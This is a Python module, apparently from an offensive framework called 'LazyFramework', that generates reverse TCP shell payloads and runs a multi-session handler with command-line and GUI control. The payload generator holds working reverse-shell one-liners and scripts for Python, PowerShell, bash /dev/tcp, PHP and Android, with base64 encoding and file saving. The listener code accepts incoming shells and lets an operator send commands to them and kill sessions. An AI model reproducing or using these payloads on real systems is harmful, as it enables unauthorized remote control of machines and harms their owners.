#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Reverse TCP Payload Generator + Multi-Handler
Supports: Python, Windows, Linux, Android, PHP, Bash
Built-in multi-session handler with GUI & CLI support
Thread-safe GUI updates using QTimer.singleShot
"""
import socket
import threading
import os
import base64
import time
import sys
import select
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

# === GUI SUPPORT (Thread-safe) ===
try:
    from PyQt6.QtCore import QMetaObject, Qt, QTimer
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

console = Console()

# === MODULE INFO ===
MODULE_INFO = {
    "name": "Reverse TCP Multi-Handler",
    "author": "LazyFramework Team",
    "description": "Generate reverse TCP payloads & handle multiple sessions. GUI + CLI.",
    "rank": "Excellent",
    "platform": "Multi",
    "arch": "Multi",
    "license": "MIT"
}

OPTIONS = {
    "LHOST": {"description": "Listener IP", "default": "0.0.0.0", "required": True},
    "LPORT": {"description": "Listener port", "default": 4444, "required": True},
    "PAYLOAD": {"description": "python, windows, linux, php, bash, android", "default": "python", "required": True},
    "OUTPUT": {"description": "Save payload to file", "default": "", "required": False},
    "ENCODE": {"description": "Encode with base64 [yes/no]", "default": "no", "required": False}
}

# === GLOBAL SESSION STORAGE (CLI + GUI) ===
SESSIONS = {}
SESSION_LOCK = threading.Lock()

# === PAYLOAD GENERATOR ===
def generate_payload(lhost, lport, payload_type):
    payloads = {
        "python": f"""import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])""",

        "windows": f"""powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"""",

        "linux": f"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",

        "php": f"""<?php set_time_limit(0); $ip='{lhost}'; $port={lport}; $sock=fsockopen($ip,$port); while($sock){{$cmd=fread($sock,1024); if(!$cmd) break; $output=shell_exec($cmd); fwrite($sock,$output);}} fclose($sock); ?>""",

        "bash": f"""bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'""",

        "android": f"""import socket,subprocess,os,ssl
context = ssl._create_unverified_context()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = context.wrap_socket(s, server_hostname="{lhost}")
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/system/bin/sh","-i"])"""
    }
    return payloads.get(payload_type.lower(), "").strip()

# === SEND COMMAND FUNCTION (for GUI) ===
def send_session_command(session_id, command):
    """Send command to specific session (untuk GUI)"""
    if session_id not in SESSIONS:
        console.print(f"[red]Session {session_id} tidak ditemukan[/]")
        return False
    
    session = SESSIONS[session_id]
    sock = session['socket']
    
    try:
        # Send command dengan newline
        sock.send((command + "\n").encode())
        console.print(f"[green]Perintah berhasil dikirim: {command}[/]")
        return True
    except Exception as e:
        console.print(f"[red]Gagal mengirim perintah: {e}[/]")
        return False

# === IMPROVED HANDLER (FIXED - No Echo Loop) ===
def handler(client_sock, addr, framework_session):
    sess_id = f"{addr[0]}_{int(time.time() * 10000) % 10000}"

    session_data = {
        'socket': client_sock,
        'ip': addr[0],
        'port': addr[1],
        'type': 'reverse_tcp', 
        'output': '',
        'created': time.strftime("%H:%M:%S"),
        'status': 'alive'
    }

    # === GUI INTEGRATION ===
    gui_sessions = framework_session.get('gui_sessions')
    gui_instance = framework_session.get('gui_instance')

    # Add to GUI (thread-safe)
    if gui_sessions is not None:
        with gui_sessions['lock']:
            gui_sessions['dict'][sess_id] = session_data
        if GUI_AVAILABLE and gui_instance:
            QTimer.singleShot(0, gui_instance.update_sessions_ui)

    # Add to global SESSIONS
    with SESSION_LOCK:
        SESSIONS[sess_id] = session_data

    console.print(f"[bold green][+] Session {sess_id} opened from {addr}[/]")

    try:
        # Set socket timeout untuk non-blocking
        client_sock.settimeout(1)  # Increased timeout to allow for data to be received
        buffer = ""
        
        while True:
            try:
                # HANYA RECEIVE DATA DARI CLIENT (shell)
                data = client_sock.recv(4096)
                if not data:
                    break  # Connection closed
                    
                decoded_data = data.decode('utf-8', errors='ignore')
                buffer += decoded_data
                
                # Process complete lines
                if '\n' in buffer:
                    lines = buffer.split('\n')
                    buffer = lines[-1]  # Keep incomplete line
                    
                    for line in lines[:-1]:
                        if line.strip():
                            # SIMPAN OUTPUT KE SESSION (TANPA MENGIRIM BALIK)
                            if gui_sessions:
                                with gui_sessions['lock']:
                                    if sess_id in gui_sessions['dict']:
                                        gui_sessions['dict'][sess_id]['output'] += line + "\n"
                            
                            with SESSION_LOCK:
                                if sess_id in SESSIONS:
                                    SESSIONS[sess_id]['output'] += line + "\n"
                            
                            # Update GUI jika ada instance
                            if GUI_AVAILABLE and gui_instance:
                                QTimer.singleShot(0, lambda sid=sess_id, l=line: gui_instance.append_output(f"[session:{sid}] {l}"))

            except socket.timeout:
                continue  # Timeout normal untuk non-blocking
            except Exception as e:
                console.print(f"[red]Receive error: {e}[/]")
                break

    except Exception as e:
        console.print(f"[red][!] Handler error: {e}[/]")

    finally:
        try:
            client_sock.close()
        except:
            pass

        # Remove from GUI
        if gui_sessions:
            with gui_sessions['lock']:
                gui_sessions['dict'].pop(sess_id, None)
            if GUI_AVAILABLE and gui_instance:
                QTimer.singleShot(0, gui_instance.update_sessions_ui)

        # Remove from global
        with SESSION_LOCK:
            SESSIONS.pop(sess_id, None)

        console.print(f"[bold red][-] Session {sess_id} closed[/]")

# === LISTENER + HANDLER (Thread-safe GUI Update) ===
def start_listener(lhost, lport, framework_session):
    def connection_handler(client_sock, addr):
        handler(client_sock, addr, framework_session)

    # === SERVER ===
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((lhost, lport))
        server.listen(10)
        console.print(f"[bold cyan][*] Listening on {lhost}:{lport}...[/]")
        while True:
            client_sock, addr = server.accept()
            t = threading.Thread(target=connection_handler, args=(client_sock, addr), daemon=True)
            t.start()
    except Exception as e:
        console.print(f"[red][!] Listener error: {e}[/]")
    finally:
        server.close()

# === MAIN RUN ===
def run(session, options):
    lhost = options.get("LHOST")
    lport = int(options.get("LPORT"))
    payload_type = options.get("PAYLOAD").lower()
    output_file = options.get("OUTPUT")
    encode = options.get("ENCODE", "no").lower() == "yes"

    # Validate payload
    if payload_type not in ["python", "windows", "linux", "php", "bash", "android"]:
        console.print(f"[red][!] Invalid PAYLOAD: {payload_type}[/]")
        return

    # Generate
    payload = generate_payload(lhost, lport, payload_type)
    if not payload:
        console.print("[red][!] Failed to generate payload[/]")
        return

    if encode:
        payload = base64.b64encode(payload.encode()).decode()
        console.print("[yellow][*] Payload encoded with base64[/]")

    # Save file
    if output_file:
        ext = {"windows": ".ps1", "php": ".php", "python": ".py", "android": ".py", "bash": ".sh", "linux": ".sh"}.get(payload_type, ".txt")
        if not output_file.endswith(ext):
            output_file += ext
        try:
            with open(output_file, "w") as f:
                f.write(payload)
            console.print(f"[green][+] Payload saved: {output_file}[/]")
        except Exception as e:
            console.print(f"[red][!] Save failed: {e}[/]")

    # Show payload
    console.print("\n[bold white]Payload:[/]")
    console.print(Panel(payload, title=payload_type.upper(), border_style="blue"))

    # Start listener
    console.print(f"\n[bold yellow][*] Starting listener on {lhost}:{lport}...[/]")
    console.print("[dim]Sessions will appear in GUI → Sessions tab[/]")

    listener_thread = threading.Thread(
        target=start_listener,
        args=(lhost, lport, session),
        daemon=True
    )
    listener_thread.start()

    # Save session refs
    session['reverse_tcp_listener'] = listener_thread
    session['reverse_tcp_sessions'] = SESSIONS
    session['reverse_tcp_lock'] = SESSION_LOCK

    # === CLI MODE (non-GUI) ===
    if hasattr(sys.stdin, 'fileno') and not session.get('gui_mode', False):
        try:
            while True:
                cmd = input("lzf(sessions) > ").strip()
                if cmd == "sessions":
                    show_sessions()
                elif cmd.startswith("interact "):
                    sid = cmd.split(maxsplit=1)[1]
                    interact_session(sid)
                elif cmd.startswith("kill "):
                    sid = cmd.split(maxsplit=1)[1]
                    kill_session(sid)
                elif cmd in ["exit", "quit", "back"]:
                    break
        except (EOFError, KeyboardInterrupt):
            pass

# === CLI COMMANDS ===
def show_sessions():
    if not SESSIONS:
        console.print("[yellow][!] No active sessions[/]")
        return
    table = Table(title="Active Sessions")
    table.add_column("ID")
    table.add_column("IP")
    table.add_column("Port")
    table.add_column("Type")
    table.add_column("Created")
    for sid, s in SESSIONS.items():
        table.add_row(sid, s['ip'], str(s['port']), s['type'], s['created'])
    console.print(table)

def interact_session(sid):
    if sid not in SESSIONS:
        console.print(f"[red][!] Session {sid} not found[/]")
        return
        
    console.print(f"[green][*] Interacting with {sid}... (Type 'exit' to return)[/]")
    
    try:
        while True:
            cmd = input(f"{sid} > ").strip()
            if cmd.lower() in ["exit", "quit"]:
                break
            if not cmd:
                continue
                
            # Send command dan dapatkan response
            if send_session_command(sid, cmd):
                # Tunggu sebentar untuk response
                time.sleep(0.5)
                
                # Tampilkan output terbaru dari session
                if sid in SESSIONS:
                    output = SESSIONS[sid]['output']
                    # Hanya tampilkan output yang baru
                    lines = output.split('\n')
                    if len(lines) > 10:  # Batasi output
                        lines = lines[-10:]
                    console.print('\n'.join(lines))
            else:
                console.print(f"[red]Failed to send command[/]")
                
    except KeyboardInterrupt:
        console.print(f"\n[yellow][*] Returning to main menu...[/]")
    except Exception as e:
        console.print(f"[red][!] Interaction error: {e}[/]")

def kill_session(sid):
    if sid not in SESSIONS:
        console.print(f"[red][!] Session {sid} not found[/]")
        return

    try:
        # 1. Tutup socket
        SESSIONS[sid]['socket'].close()

        # 2. Hapus dari SESSIONS (thread-safe)
        with SESSION_LOCK:
            SESSIONS.pop(sid, None)

        # 3. Hapus dari GUI (thread-safe)
        gui_sessions = None
        gui_instance = None
        # Cari session dari framework (jika ada)
        if 'framework_session' in globals():
            fs = globals()['framework_session']
            gui_sessions = fs.get('gui_sessions')
            gui_instance = fs.get('gui_instance')

        if gui_sessions and GUI_AVAILABLE and gui_instance:
            def safe_gui_update():
                with gui_sessions['lock']:
                    gui_sessions['dict'].pop(sid, None)
                gui_instance.update_sessions_ui()
            QTimer.singleShot(0, safe_gui_update)

        console.print(f"[green][+] Session {sid} killed[/]")
    except Exception as e:
        console.print(f"[red][!] Kill failed: {e}[/]")

# === GUI INTEGRATION HELPERS ===
def get_active_sessions():
    """Get active sessions for GUI"""
    with SESSION_LOCK:
        return SESSIONS.copy()

def close_session(session_id):
    """Close specific session from GUI"""
    kill_session(session_id)
